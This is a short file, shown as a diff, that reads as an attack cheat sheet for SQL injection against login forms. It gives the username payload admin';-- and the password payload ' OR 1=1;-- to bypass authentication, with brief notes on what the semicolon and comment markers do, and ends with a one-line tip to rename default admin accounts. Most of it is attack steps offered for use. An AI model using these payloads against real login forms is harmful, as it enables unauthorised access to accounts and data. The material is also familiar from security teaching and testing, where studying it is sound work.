@@ -1,0 +1,25 @@
+/* Medium - Try in login forms **
+** Blind SQL Injection **
+**(where no error messages are being displayed)*/
+
+/*STEP 1 - Always try standard usernames like 'admin', 'administrator', 'sa', 'root', 'superuser', etc.*/
+--Use it username field - example:
+_________________________
+|Username: admin';--    |
+-------------------------
+|Password:              |
+-------------------------
+[; == end of command,
+-- == comment everything else after that]
+
+/*STEP 1 - Alternative way: Try 'OR 1=1' logic*/
+--Use it username field - example:
+_________________________
+|Username: (null)       |
+-------------------------
+|Password: ' OR 1=1;--  |
+-------------------------
+[; == end of command,
+-- == comment everything else after that]
+
+****ATTN: Always change admin / administrator / sa / root / superuser to something common i.e. your name! ****
